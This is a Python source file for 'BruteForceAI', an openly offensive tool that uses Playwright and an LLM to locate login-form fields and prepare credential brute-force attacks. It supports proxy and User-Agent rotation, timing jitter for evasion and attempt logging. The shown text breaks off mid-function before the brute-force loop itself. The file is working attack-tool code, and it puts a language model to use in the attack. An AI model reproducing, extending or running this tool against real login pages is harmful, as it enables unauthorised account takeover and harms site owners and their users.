# -*- coding: utf-8-sig -*-
"""
BruteForceAI Unified - AI-Powered Login Form Analysis & Brute Force Attack Tool
Author  : Mor David (www.mordavid.com)
License : Non-Commercial
Version : 2.0.0 (Unified Edition)

Changelog v2.0.0:
  - Merged BruteForceCore.py + BruteForceAI.py into one self-contained file
  - Extracted _parse_llm_json() helper to eliminate duplicated JSON parsing
  - Consolidated all Colors attributes into disable() via setattr loop
  - Unified import block at top; removed scattered inline imports
  - Fixed OutputCapture: getattr fallback so --output works on all subcommands
  - Hardened _get_existing_selectors to always return None on empty DB
  - Added explicit float cast in _calculate_delay_with_jitter
  - Cleaned dead / commented-out code in _validate_selectors_with_details
  - Docstrings normalised; no functional regressions
"""

import sqlite3
import os
import re
import sys
import json
import time
import random
import threading
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

import requests
import yaml
from playwright.sync_api import sync_playwright

# ---------------------------------------------------------------------------
# Version / update check
# ---------------------------------------------------------------------------
CURRENT_VERSION = "2.0.0"
VERSION_CHECK_URL = "https://mordavid.com/md_versions.yaml"


def check_for_updates(silent=False, force=False):
    """
    Check for updates from mordavid.com.

    Args:
        silent: If True, suppress "up to date" message.
        force : If True, bypass any cached state (reserved for future use).

    Returns:
        dict | None: Update info dict, or None if the check failed.
    """
    try:
        resp = requests.get(VERSION_CHECK_URL, timeout=3)
        resp.raise_for_status()
        data = yaml.safe_load(resp.text)

        info = next(
            (s for s in data.get("softwares", [])
             if s.get("name", "").lower() == "bruteforceai"),
            None,
        )
        if not info:
            return None

        latest = info.get("version", "0.0.0")
        if latest != CURRENT_VERSION:
            print(
                f"🔄 Update available: v{CURRENT_VERSION} → v{latest} "
                f"| Download: {info.get('url', 'N/A')}\n"
            )
            return {"update_available": True, "current_version": CURRENT_VERSION,
                    "latest_version": latest, "info": info}
        else:
            if not silent:
                print(f"✅ BruteForceAI v{CURRENT_VERSION} is up to date\n")
            return {"update_available": False, "current_version": CURRENT_VERSION,
                    "latest_version": latest}
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Terminal colors
# ---------------------------------------------------------------------------
class Colors:
    """ANSI color codes for terminal output."""
    RED       = "\033[91m"
    GREEN     = "\033[92m"
    YELLOW    = "\033[93m"
    BLUE      = "\033[94m"
    MAGENTA   = "\033[95m"
    CYAN      = "\033[96m"
    WHITE     = "\033[97m"
    BOLD      = "\033[1m"
    UNDERLINE = "\033[4m"
    RESET     = "\033[0m"

    @classmethod
    def disable(cls):
        """Strip all colour codes (useful for file/CI output)."""
        for attr in ("RED", "GREEN", "YELLOW", "BLUE", "MAGENTA",
                     "CYAN", "WHITE", "BOLD", "UNDERLINE", "RESET"):
            setattr(cls, attr, "")


# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
def print_banner(no_color=False, check_updates=True):
    """Print the tool banner and optionally check for updates."""
    if no_color:
        Colors.disable()

    banner = (
        f"{Colors.RED}{Colors.BOLD}\n"
        "  █▀▄ █▀▄ █ █ ▀█▀ █▀▀ █▀▀ █▀█ █▀▄ █▀▀ █▀▀   █▀█ ▀█▀ \n"
        "  █▀▄ █▀▄ █ █  █  █▀▀ █▀▀ █ █ █▀▄ █   █▀▀   █▀█  █  \n"
        f"  ▀▀  ▀ ▀ ▀▀▀  ▀  ▀▀▀ ▀   ▀▀▀ ▀ ▀ ▀▀▀ ▀▀▀   ▀ ▀ ▀▀▀ {Colors.RESET}\n"
        f"{Colors.YELLOW}{Colors.BOLD}🤖 BruteForceAI Attack - Smart brute-force tool using LLM 🧠{Colors.RESET}\n"
        f"{Colors.CYAN}{Colors.BOLD}Version {CURRENT_VERSION} | Author: Mor David (www.mordavid.com) | License: Non-Commercial{Colors.RESET}\n"
    )
    print(banner)
    if check_updates:
        check_for_updates(silent=False)


# ---------------------------------------------------------------------------
# Output capture (tee to file + stdout)
# ---------------------------------------------------------------------------
class OutputCapture:
    """Tee stdout/stderr to a file while still printing to the console."""

    def __init__(self, filename):
        self.filename = filename
        self.file = None
        self._orig_stdout = sys.stdout
        self._orig_stderr = sys.stderr

    def start(self):
        try:
            self.file = open(self.filename, "w", encoding="utf-8-sig")
            sys.stdout = self
            sys.stderr = self
            return True
        except Exception as e:
            print(f"❌ Error opening output file {self.filename}: {e}")
            return False

    def stop(self):
        if self.file:
            sys.stdout = self._orig_stdout
            sys.stderr = self._orig_stderr
            self.file.close()
            print(f"📄 Output saved to: {self.filename}")

    def write(self, text):
        self._orig_stdout.write(text)
        if self.file:
            self.file.write(text)
            self.file.flush()

    def flush(self):
        self._orig_stdout.flush()
        if self.file:
            self.file.flush()


# ---------------------------------------------------------------------------
# LLM validation helpers (module-level, used before BruteForceAI init)
# ---------------------------------------------------------------------------
def _check_ollama_availability(ollama_url="http://localhost:11434"):
    try:
        resp = requests.get(f"{ollama_url}/api/tags", timeout=3)
        return resp.status_code == 200
    except Exception:
        return False


def _check_ollama_model(model_name, ollama_url="http://localhost:11434"):
    try:
        resp = requests.get(f"{ollama_url}/api/tags", timeout=3)
        if resp.status_code == 200:
            models = resp.json().get("models", [])
            names = [m.get("name", "") for m in models]
            base_names = [n.split(":")[0] for n in names]
            model_base = model_name.split(":")[0]
            return model_name in names or model_base in base_names
        return False
    except Exception:
        return False


def _validate_llm_setup(llm_provider, llm_model, llm_api_key=None, ollama_url=None):
    """Validate LLM config and exit with a helpful message if broken."""
    if not llm_provider or not llm_model:
        return True

    if llm_provider.lower() == "ollama":
        url = ollama_url or "http://localhost:11434"
        print(f"🔍 Checking Ollama setup at {url}...")
        if not _check_ollama_availability(url):
            print(f"❌ Ollama is not running or not reachable at {url}")
            print("🔧 Fix: install from https://ollama.ai/download and start the service.")
            sys.exit(1)
        if not _check_ollama_model(llm_model, url):
            print(f"❌ Model '{llm_model}' not found in Ollama at {url}")
            print(f"🔧 Fix: run  ollama pull {llm_model}")
            sys.exit(1)
        print(f"✅ Ollama ready – model '{llm_model}' at {url}")

    elif llm_provider.lower() == "groq":
        print("🔍 Checking Groq setup...")
        if not llm_api_key:
            print("❌ Groq requires --llm-api-key.  Get one at https://console.groq.com/")
            sys.exit(1)
        if not llm_api_key.startswith("gsk_"):
            print("⚠️  Groq API keys usually start with 'gsk_' – double-check your key.")
        print(f"✅ Groq configured – model '{llm_model}' will be validated on first use.")
        if llm_model not in ("llama-3.3-70b-versatile", "llama3-70b-8192", "gemma2-9b-it"):
            print("💡 Recommended models: llama-3.3-70b-versatile | llama3-70b-8192 | gemma2-9b-it")

    return True


# ---------------------------------------------------------------------------
# Shared JSON-parsing helper
# ---------------------------------------------------------------------------
def _parse_llm_json(response):
    """
    Robustly parse a JSON object from an LLM text response.

    Tries three strategies in order:
      1. Direct json.loads
      2. Strip markdown fences, then json.loads
      3. Regex-extract the first {...} block containing 'login_username_selector'

    Returns:
        dict | None
    """
    if not response:
        return None
    # Strategy 1 – direct parse
    try:
        return json.loads(response)
    except json.JSONDecodeError:
        pass
    # Strategy 2 – strip fences
    cleaned = re.sub(r"```json\s*|```", "", response).strip()
    try:
        return json.loads(cleaned)
    except json.JSONDecodeError:
        pass
    # Strategy 3 – regex extraction
    match = re.search(
        r'\{[^{}]*"login_username_selector"[^{}]*\}', cleaned, re.DOTALL
    )
    if match:
        try:
            return json.loads(match.group(0))
        except json.JSONDecodeError:
            pass
    return None


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------
class BruteForceAI:
    """AI-powered login brute-force tool using Playwright and an LLM backend."""

    def __init__(
        self,
        urls_file,
        usernames_file,
        passwords_file,
        selector_retry=3,
        show_browser=False,
        browser_wait=0,
        proxy=None,
        database="bruteforce.db",
        llm_provider=None,
        llm_model=None,
        llm_api_key=None,
        ollama_url=None,
        force_reanalyze=False,
        debug=False,
        retry_attempts=3,
        dom_threshold=100,
        verbose=False,
        delay=0,
        jitter=0,
        success_exit=False,
        user_agents_file=None,
        force_retry=False,
        discord_webhook=None,
        slack_webhook=None,
        teams_webhook=None,
        telegram_webhook=None,
        telegram_chat_id=None,
    ):
        self.urls          = self._load_data(urls_file)
        self.usernames     = self._load_data(usernames_file)
        self.passwords     = self._load_data(passwords_file)
        self.selector_retry   = selector_retry
        self.show_browser     = show_browser
        self.browser_wait     = browser_wait
        self.proxy            = proxy
        self.database         = database
        self.llm_provider     = llm_provider
        self.llm_model        = llm_model
        self.llm_api_key      = llm_api_key
        self.ollama_url       = ollama_url or "http://localhost:11434"
        self.force_reanalyze  = force_reanalyze
        self.debug            = debug
        self.retry_attempts   = retry_attempts
        self.dom_threshold    = dom_threshold
        self.verbose          = verbose
        self.delay            = delay
        self.jitter           = jitter
        self.success_exit     = success_exit
        self.force_retry      = force_retry
        self.discord_webhook  = discord_webhook
        self.slack_webhook    = slack_webhook
        self.teams_webhook    = teams_webhook
        self.telegram_webhook = telegram_webhook
        self.telegram_chat_id = telegram_chat_id

        # User-Agent rotation
        self.user_agents = []
        if user_agents_file:
            try:
                self.user_agents = self._load_file_lines(user_agents_file)
                print(f"🌐 Loaded {len(self.user_agents)} User-Agent strings")
            except Exception as e:
                print(f"⚠️  Could not load User-Agents file: {e}")

        self.external_ip = self._get_external_ip()
        if self.debug:
            print(f"🌐 External IP: {self.external_ip or 'Unknown'}")

        self._check_or_create_database()
        self._print_webhook_config()

    # ------------------------------------------------------------------
    # Data loading
    # ------------------------------------------------------------------
    def _load_data(self, data):
        if isinstance(data, list):
            return data
        if isinstance(data, str):
            return self._load_file_lines(data)
        raise ValueError(f"Invalid data type for urls/usernames/passwords: {type(data)}")

    def _load_file_lines(self, file_path):
        try:
            with open(file_path, "r", encoding="utf-8-sig") as fh:
                return [line.strip() for line in fh if line.strip()]
        except FileNotFoundError:
            print(f"❌ File not found: {file_path}")
            sys.exit(1)
        except Exception as e:
            print(f"❌ Error reading {file_path}: {e}")
            sys.exit(1)

    # ------------------------------------------------------------------
    # Database
    # ------------------------------------------------------------------
    def _check_or_create_database(self):
        if not os.path.exists(self.database):
            print(f"Database not found, creating: {self.database}")
        else:
            print(f"Database found: {self.database}")
        self._create_database()

    def _create_database(self):
        conn = sqlite3.connect(self.database)
        cur  = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS form_analysis (
                id                          INTEGER PRIMARY KEY AUTOINCREMENT,
                url                         TEXT UNIQUE,
                login_username_selector     TEXT,
                login_password_selector     TEXT,
                login_submit_button_selector TEXT,
                dom_length                  TEXT,
                failed_dom_length           TEXT,
                dom_change                  INTEGER,
                test_username_used          TEXT,
                success                     BOOLEAN,
                attempts                    INTEGER,
                playwright_or_requests      TEXT DEFAULT 'playwright',
                timestamp                   DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS brute_force_attempts (
                id                     INTEGER PRIMARY KEY AUTOINCREMENT,
                url                    TEXT,
                username_or_email      TEXT,
                password               TEXT,
                dom_length             TEXT,
                failed_dom_length      TEXT,
                success                BOOLEAN,
                response_time_ms       INTEGER,
                playwright_or_requests TEXT DEFAULT 'playwright',
                proxy_server           TEXT,
                external_ip            TEXT,
                timestamp              DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        conn.close()
        print(f"Database initialised: {self.database}")

    def clean_database(self):
        """Truncate all database tables."""
        conn = sqlite3.connect(self.database)
        cur  = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM form_analysis")
        fa_count = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM brute_force_attempts")
        bf_count = cur.fetchone()[0]
        print(f"📊 Records before clean – form_analysis: {fa_count}, brute_force_attempts: {bf_count}")
        cur.execute("DELETE FROM form_analysis")
        cur.execute("DELETE FROM brute_force_attempts")
        for tbl in ("form_analysis", "brute_force_attempts"):
            cur.execute("DELETE FROM sqlite_sequence WHERE name=?", (tbl,))
        conn.commit()
        conn.close()
        print("✅ Database cleaned – all tables truncated")

    # ------------------------------------------------------------------
    # LLM interface
    # ------------------------------------------------------------------
    def _llm_prompt(self, prompt, system_prompt=None):
        """Dispatch to the configured LLM provider."""
        if not self.llm_provider or not self.llm_model:
            print("❌ LLM provider/model not configured")
            return None
        if self.llm_provider.lower() == "ollama":
            return self._ollama_request(prompt, system_prompt)
        if self.llm_provider.lower() == "groq":
            return self._groq_request(prompt, system_prompt)
        print(f"❌ Unsupported LLM provider: {self.llm_provider}")
        return None

    def _ollama_request(self, prompt, system_prompt=None):
        try:
            url  = f"{self.ollama_url}/api/generate"
            data = {"model": self.llm_model, "prompt": prompt, "stream": False}
            if system_prompt:
                data["system"] = system_prompt
            resp = requests.post(url, json=data, timeout=60)
            resp.raise_for_status()
            return resp.json().get("response", "")
        except Exception as e:
            print(f"❌ Ollama request error: {e}")
            return None

    def _groq_request(self, prompt, system_prompt=None):
        try:
            if not self.llm_api_key:
                print("❌ Groq API key not provided")
                return None
            messages = []
            if system_prompt:
                messages.append({"role": "system", "content": system_prompt})
            messages.append({"role": "user", "content": prompt})
            resp = requests.post(
                "https://api.groq.com/openai/v1/chat/completions",
                headers={"Authorization": f"Bearer {self.llm_api_key}",
                         "Content-Type": "application/json"},
                json={"model": self.llm_model, "messages": messages,
                      "temperature": 0.7, "max_tokens": 1024},
                timeout=60,
            )
            resp.raise_for_status()
            return resp.json()["choices"][0]["message"]["content"]

        except requests.exceptions.HTTPError as e:
            code = e.response.status_code
            hints = {
                400: ("Bad Request – invalid API key format, oversized request, or wrong model name.\n"
                      "Try: --llm-model llama-3.3-70b-versatile"),
                401: "Unauthorized – your API key is invalid or expired. Get a new one at https://console.groq.com/",
                429: ("Rate limited. Try a lighter model (gemma2-9b-it) or switch to Ollama."),
            }
            print(f"❌ Groq HTTP {code}: {hints.get(code, str(e))}")
            return None
        except Exception as e:
            print(f"❌ Groq request error: {e}")
            return None

    # ------------------------------------------------------------------
    # Stage 1 – form analysis
    # ------------------------------------------------------------------
    def stage1(self, url):
        """
        Analyse a login page with the browser + LLM to discover CSS selectors.

        Returns:
            dict with selector data, or None on failure.
        """
        print(f"Stage 1: Analysing {url}")

        existing = self._get_existing_selectors(url)
        if existing and not self.force_reanalyze:
            print(f"✅ Using cached selectors for {url}")
            for k, v in existing.items():
                print(f"   {k}: {v}")
            return existing

        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(
                    headless=not self.show_browser,
                    slow_mo=1000 if self.show_browser else 0,
                )
                ctx_args = {"ignore_https_errors": True}
                if self.proxy:
                    ctx_args["proxy"] = {"server": self.proxy}
                ua = self._get_random_user_agent()
                if ua:
                    ctx_args["user_agent"] = ua
                context = browser.new_context(**ctx_args)
                page    = context.new_page()

                print(f"🌐 Navigating to: {url}")
                page.goto(url, timeout=30000)
                page.wait_for_load_state("networkidle")

                if self.show_browser and self.browser_wait > 0:
                    print(f"⏸️  Visible browser – waiting {self.browser_wait}s …")
                    time.sleep(self.browser_wait)

                html_content    = page.content()
                clean_dom_len   = len(html_content)
                print(f"📄 Page loaded, clean DOM length: {clean_dom_len}")

                processed_html  = self._extract_form_content(html_content)
                selectors       = None
                failed_info     = ""
                best_selectors  = {}

                for attempt in range(1, self.selector_retry + 1):
                    print(f"🔍 LLM attempt {attempt}/{self.selector_retry}")
                    raw = (
                        self._analyze_with_llm(processed_html)
                        if attempt == 1
                        else self._analyze_with_llm_retry(processed_html, failed_info, attempt)
                    )
                    if not raw:
                        print(f"❌ LLM returned nothing on attempt {attempt}")
                        continue

                    validated, details = self._validate_selectors(page, raw)

                    # Accumulate any working selectors
                    working = self._extract_working_selectors(raw, details)
                    if working:
                        best_selectors.update(working)
                        print(f"💾 Accumulated {len(best_selectors)}/3 selectors")

                    target = validated if validated else (best_selectors if len(best_selectors) == 3 else None)
                    if target:
                        if len(best_selectors) == 3 and not validated:
                            target_v, _ = self._validate_selectors(page, best_selectors)
                            if not target_v:
                                failed_info = self._prepare_failure_feedback(raw, details, best_selectors)
                                continue
                            target = target_v

                        # Measure failed-login DOM
                        test_result = self._test_login_attempt(page, target, clean_dom_len, html_content)
                        failed_dom  = test_result["failed_dom_length"] if test_result else None
                        dom_change  = test_result["dom_change"]        if test_result else None
                        test_user   = test_result["test_username_used"] if test_result else None

                        result = {
                            "url": url,
                            "login_username_selector":      target.get("login_username_selector"),
                            "login_password_selector":      target.get("login_password_selector"),
                            "login_submit_button_selector": target.get("login_submit_button_selector"),
                            "dom_length":       str(clean_dom_len),
                            "failed_dom_length": str(failed_dom) if failed_dom is not None else None,
                            "dom_change":       dom_change,
                            "test_username_used": test_user,
                            "success":          True,
                            "attempts":         attempt,
                            "playwright_or_requests": "playwright",
                        }
                        self._save_form_analysis(result)
                        self._print_stage1_summary(result)
                        browser.close()
                        return result

                    failed_info = self._prepare_failure_feedback(raw, details, best_selectors)

                # All attempts exhausted
                print(f"❌ Stage 1 failed for {url} after {self.selector_retry} attempts")
                result = {
                    "url": url,
                    "login_username_selector":      best_selectors.get("login_username_selector"),
                    "login_password_selector":      best_selectors.get("login_password_selector"),
                    "login_submit_button_selector": best_selectors.get("login_submit_button_selector"),
                    "dom_length":       str(clean_dom_len),
                    "failed_dom_length": None,
                    "dom_change":       None,
                    "test_username_used": None,
                    "success":          False,
                    "attempts":         self.selector_retry,
                    "playwright_or_requests": "playwright",
                }
                self._save_form_analysis(result)
                browser.close()
                return None

        except Exception as e:
            print(f"❌ Stage 1 error for {url}: {e}")
            self._save_form_analysis({
                "url": url,
                "login_username_selector": None,
                "login_password_selector": None,
                "login_submit_button_selector": None,
                "dom_length": None, "failed_dom_length": None,
                "dom_change": None, "test_username_used": None,
                "success": False, "attempts": 1,
                "playwright_or_requests": "playwright",
            })
            return None

    def _print_stage1_summary(self, result):
        print(f"✅ Stage 1 completed for {result['url']}")
        print(f"   Username selector : {result['login_username_selector']}")
        print(f"   Password selector : {result['login_password_selector']}")
        print(f"   Submit selector   : {result['login_submit_button_selector']}")
        print(f"   Clean DOM length  : {result['dom_length']}")
        print(f"   Failed DOM length : {result['failed_dom_length']}")
        if result["dom_change"] is not None:
            print(f"   DOM change        : {result['dom_change']} chars")
        if result["test_username_used"]:
            print(f"   Test e-mail       : {result['test_username_used']}")

    # ------------------------------------------------------------------
    # LLM form analysis helpers
    # ------------------------------------------------------------------
    def _build_selector_prompt(self, html, feedback=""):
        base = (
            "Analyse this HTML and identify CSS selectors for the login form:\n\n"
            "1. login_username_selector – CSS selector for username/email input\n"
            "2. login_password_selector – CSS selector for password input\n"
            "3. login_submit_button_selector – CSS selector for the submit button\n"
        )
        if feedback:
            base = f"RETRY – previous selectors failed. Details:\n{feedback}\n\n" + base + (
                "\nCRITICAL: keep selectors marked WORKING exactly as-is. "
                "Only replace failed/missing ones.\n"
            )
        return base + f"\nHTML:\n{html}\n\nReturn ONLY valid JSON:\n" + (
            '{\n  "login_username_selector": "...",\n'
            '  "login_password_selector": "...",\n'
            '  "login_submit_button_selector": "..."\n}'
        )

    def _analyze_with_llm(self, html_content):
        processed = self._extract_form_content(html_content)
        system    = "You are a web-scraping expert. Return only valid JSON with CSS selectors for the login form."
        response  = self._llm_prompt(self._build_selector_prompt(processed), system)
        result    = _parse_llm_json(response)
        if result is None and response:
            print(f"❌ Failed to parse LLM response:\n{response[:300]}…")
        return result

    def _analyze_with_llm_retry(self, html_content, failed_info, attempt):
        processed = self._extract_form_content(html_content)
        system    = (
            f"You are a web-scraping expert on retry #{attempt}. "
            "NEVER change selectors marked WORKING. Return only valid JSON."
        )
        if self.debug:
            print(f"🔍 DEBUG – sending retry #{attempt} to LLM")
        response = self._llm_prompt(
            self._build_selector_prompt(processed, feedback=failed_info), system
        )
        result = _parse_llm_json(response)
        if result is None and response:
            print(f"❌ Failed to parse LLM retry response:\n{response[:300]}…")
        return result

    # ------------------------------------------------------------------
    # Selector validation
    # ------------------------------------------------------------------
    def _validate_selectors(self, page, selectors):
        """
        Try typing into username/password fields and hovering over the submit
        button.  Returns (validated_dict | None, details_dict).
        """
        validated = {}
        details   = {}
        test_user = "fake_test_user_12345"
        test_pass = "fake_test_password_12345"

        # Username
        sel = selectors.get("login_username_selector")
        if sel:
            try:
                el = page.locator(sel).first
                if el.count() > 0:
                    itype = el.get_attribute("type")
                    if itype in ("text", "email", None):
                        el.clear()
                        el.fill(test_user)
                        if el.input_value() == test_user:
                            validated["login_username_selector"] = sel
                            details["username"] = f"✅ {itype or 'text'} input – typing works"
                        else:
                            details["username"] = "❌ Typing failed – value mismatch"
                    else:
                        details["username"] = f"❌ Wrong input type: {itype}"
                else:
                    details["username"] = f"❌ Element not found: {sel}"
            except Exception as e:
                details["username"] = f"❌ Error: {str(e)[:60]}"

        # Password
        sel = selectors.get("login_password_selector")
        if sel:
            try:
                el = page.locator(sel).first
                if el.count() > 0:
                    if el.get_attribute("type") == "password":
                        el.clear()
                        el.fill(test_pass)
                        validated["login_password_selector"] = sel
                        details["password"] = "✅ password input – typing works"
                    else:
                        details["password"] = f"❌ Wrong type: {el.get_attribute('type')}"
                else:
                    details["password"] = f"❌ Element not found: {sel}"
            except Exception as e:
                details["password"] = f"❌ Error: {str(e)[:60]}"

        # Submit button
        sel = selectors.get("login_submit_button_selector")
        if sel:
            try:
                el = page.locator(sel).first
                if el.count() > 0:
                    tag = el.evaluate("el => el.tagName.toLowerCase()")
                    if el.is_enabled() and el.is_visible():
                        el.hover()
                        validated["login_submit_button_selector"] = sel
                        details["submit"] = f"✅ {tag} – clickable and visible"
                    else:
                        details["submit"] = f"❌ {tag} not enabled/visible"
                else:
                    details["submit"] = f"❌ Element not found: {sel}"
            except Exception as e:
                details["submit"] = f"❌ Error: {str(e)[:60]}"

        # Clean up test input
        for field in ("login_username_selector", "login_password_selector"):
            s = validated.get(field)
            if s:
                try:
                    page.locator(s).first.clear()
                except Exception:
                    pass

        for field, msg in details.items():
            print(f"   {field.capitalize()}: {msg}")

        if len(validated) == 3:
            print("✅ All selectors validated")
            return validated, details
        print(f"❌ Validation: {len(validated)}/3 selectors working")
        return None, details

    def _extract_working_selectors(self, selectors, details):
        working = {}
        for field, selector in selectors.items():
            key = field.replace("login_", "").replace("_selector", "")
            if "✅" in details.get(key, ""):
                working[field] = selector
        return working or None

    def _prepare_failure_feedback(self, failed_selectors, details, best_selectors):
        lines = ["PREVIOUS ATTEMPT RESULTS:"]
        working_lines = []
        failed_lines  = []

        for field, selector in best_selectors.items():
            name = field.replace("login_", "").replace("_selector", "").upper()
            working_lines.append(f"- {name}: '{selector}' – ✅ WORKING (keep exactly!)")

        for field, selector in failed_selectors.items():
            if field in best_selectors:
                continue
            name   = field.replace("login_", "").replace("_selector", "").upper()
            detail = details.get(name.lower(), "Unknown")
            if "✅" in detail:
                working_lines.append(f"- {name}: '{selector}' – {detail} (KEEP!)")
            else:
                failed_lines.append(f"- {name}: '{selector}' – {detail}")

        if working_lines:
            lines.append("\nWORKING (keep as-is):\n" + "\n".join(working_lines))
        if failed_lines:
            lines.append("\nFAILED (replace these):\n" + "\n".join(failed_lines))

        missing = [
            f.replace("login_", "").replace("_selector", "").upper()
            for f in ("login_username_selector", "login_password_selector",
                      "login_submit_button_selector")
            if f not in best_selectors
        ]
        if missing:
            lines.append(f"\nSTILL NEEDED: {', '.join(missing)}")
        lines.append("\nIMPORTANT: keep working selectors verbatim; replace only failed/missing ones.")
        return "\n".join(lines)

    # ------------------------------------------------------------------
    # HTML pre-processing for LLM
    # ------------------------------------------------------------------
    def _extract_form_content(self, html_content, max_chars=15000):
        """
        Extract only the login-relevant elements from a full HTML page so the
        LLM receives a compact, focused snippet.
        """
        relevant = []

        patterns = [
            r'<input[^>]*type=["\'](?:text|email|password|submit)["\'][^>]*>',
            r'<input[^>]*name=["\'](?:username|email|password|login|user)["\'][^>]*>',
            r'<input[^>]*id=["\'](?:username|email|password|login|user|submit)["\'][^>]*>',
        ]
        for pat in patterns:
            relevant.extend(re.findall(pat, html_content, re.IGNORECASE))

        relevant.extend(
            re.findall(r'<button[^>]*>.*?</button>', html_content,
                       re.DOTALL | re.IGNORECASE)
        )
        for form in re.findall(r'<form[^>]*>.*?</form>', html_content,
                               re.DOTALL | re.IGNORECASE):
            if any(kw in form.lower() for kw in ("password", "login", "username", "email")):
                relevant.append(form)

        for pat in (
            r'<label[^>]*>.*?(?:username|email|password|login).*?</label>',
            r'<label[^>]*for=["\'](?:username|email|password|login|user)["\'][^>]*>.*?</label>',
        ):
            relevant.extend(re.findall(pat, html_content, re.DOTALL | re.IGNORECASE))

        # De-duplicate preserving order
        seen, unique = set(), []
        for item in relevant:
            if item not in seen:
                seen.add(item)
                unique.append(item)

        if unique:
            content = "\n".join(unique)
            print(f"📋 Extracted {len(unique)} login-related elements ({len(content)} chars)")
            return content[:max_chars] + ("…" if len(content) > max_chars else "")

        # Fallback: any input/button
        print("⚠️  No login elements found; falling back to all inputs/buttons")
        fallback = re.findall(r'<(?:input|button)[^>]*>(?:.*?</button>)?',
                              html_content, re.DOTALL | re.IGNORECASE)
        if fallback:
            content = "\n".join(fallback)
            return content[:max_chars] + ("…" if len(content) > max_chars else "")

        # Last resort: truncate raw HTML
        print("⚠️  No interactive elements found; using truncated raw HTML")
        return html_content[:max_chars] + ("…" if len(html_content) > max_chars else "")

    # ------------------------------------------------------------------
    # Login test (to measure failed-login DOM length)
    # ------------------------------------------------------------------
    def _test_login_attempt(self, page, selectors, clean_dom_len, clean_html):
        """Fill the form with garbage credentials and measure DOM change."""
        test_user = "fake_test_user_12345@example.com"
        test_pass = "fake_test_password_12345"
        print("   🔑 Testing login with dummy credentials …")
        print(f"   👤 Test username: {test_user}")

        try:
            u_sel = selectors.get("login_username_selector")
            p_sel = selectors.get("login_password_selector")
            s_sel = selectors.get("login_submit_button_selector")

            if u_sel:
                page.locator(u_sel).first.clear()
                page.locator(u_sel).first.fill(test_user)
            if p_sel:
                page.locator(p_sel).first.clear()
                page.locator(p_sel).first.fill(test_pass)

            print("   🖱️  Clicking submit …")
            if s_sel:
                try:
                    page.locator(s_sel).first.click()
                except Exception as e:
                    print(f"   ❌ Submit click failed: {str(e)[:60]}")
                    return {"failed_dom_length": None, "dom_change": None,
                            "test_username_used": test_user}
            else:
                return {"failed_dom_length": None, "dom_change": None,
                        "test_username_used": test_user}

            print("   ⏳ Waiting for login response …")
            try:
                page.wait_for_load_state("networkidle", timeout=5000)
            except Exception:
                time.sleep(2)

            if self.show_browser and self.browser_wait > 0:
                time.sleep(self.browser_wait)

            # Clear fields for clean DOM measurement
            for s in (u_sel, p_sel):
                if s:
                    try:
                        page.locator(s).first.clear()
                    except Exception:
                        pass

            failed_html = page.content()
            failed_len  = len(failed_html)
            dom_change  = abs(failed_len - clean_dom_len)

            print(f"   📊 Failed DOM length: {failed_len} (clean: {clean_dom_len}, Δ {dom_change})")
            if dom_change == 0:
                print("   ⚠️  DOM unchanged – server may ignore invalid credentials")
            elif dom_change < 10:
                print(f"   ⚠️  Minimal DOM change ({dom_change} chars)")
            else:
                print(f"   ✅ DOM changed by {dom_change} chars – server responded")

            if self.debug:
                print(f"   🔍 Clean DOM (200): {clean_html[:200]}")
                print(f"   🔍 Failed DOM (200): {failed_html[:200]}")

            return {"failed_dom_length": failed_len, "dom_change": dom_change,
                    "test_username_used": test_user}

        except Exception as e:
            print(f"   ❌ Error during login test: {str(e)[:100]}")
            return None

    # ------------------------------------------------------------------
    # Database – form analysis
    # ------------------------------------------------------------------
    def _save_form_analysis(self, result):
        try:
            conn = sqlite3.connect(self.database)
            conn.cursor().execute("""
                INSERT OR REPLACE INTO form_analysis
                (url, login_username_selector, login_password_selector,
                 login_submit_button_selector, dom_length, failed_dom_length,
                 dom_change, test_username_used, success, attempts,
                 playwright_or_requests)
                VALUES (?,?,?,?,?,?,?,?,?,?,?)
            """, (
                result["url"],
                result["login_username_selector"],
                result["login_password_selector"],
                result["login_submit_button_selector"],
                result["dom_length"],
                result["failed_dom_length"],
                result["dom_change"],
                result["test_username_used"],
                result["success"],
                result["attempts"],
                result["playwright_or_requests"],
            ))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"❌ Error saving form analysis: {e}")

    def _get_existing_selectors(self, url):
        try:
            conn = sqlite3.connect(self.database)
            cur  = conn.cursor()

            cur.execute("""
                SELECT login_username_selector, login_password_selector,
                       login_submit_button_selector
                FROM form_analysis WHERE url=? AND success=1
            """, (url,))
            row = cur.fetchone()
            if row and any(v is not None for v in row):
                conn.close()
                return {
                    "login_username_selector":      row[0],
                    "login_password_selector":      row[1],
                    "login_submit_button_selector": row[2],
                }

            cur.execute("""
                SELECT login_username_selector, login_password_selector,
                       login_submit_button_selector
                FROM form_analysis
                WHERE url=? AND (
                    login_username_selector IS NOT NULL OR
                    login_password_selector IS NOT NULL OR
                    login_submit_button_selector IS NOT NULL
                )
                ORDER BY timestamp DESC LIMIT 1
            """, (url,))
            row = cur.fetchone()
            conn.close()
            if row:
                cnt = sum(1 for v in row if v is not None)
                print(f"📋 Partial selectors for {url}: {cnt}/3")
                return {
                    "login_username_selector":      row[0],
                    "login_password_selector":      row[1],
                    "login_submit_button_selector": row[2],
                }
            return None
        except Exception as e:
            print(f"❌ Error checking existing selectors: {e}")
            return None

    def _get_selectors_from_database(self, url):
        try:
            conn = sqlite3.connect(self.database)
            cur  = conn.cursor()

            cur.execute("""
                SELECT * FROM form_analysis WHERE url=? AND success=1
                ORDER BY timestamp DESC LIMIT 1
            """, (url,))
            row = cur.fetchone()
            if row:
                cols = [d[0] for d in cur.description]
                conn.close()
                return dict(zip(cols, row))

            cur.execute("""
                SELECT * FROM form_analysis
                WHERE url=? AND login_username_selector IS NOT NULL
                  AND login_password_selector IS NOT NULL
                  AND login_submit_button_selector IS NOT NULL
                ORDER BY timestamp DESC LIMIT 1
            """, (url,))
            row = cur.fetchone()
            if row:
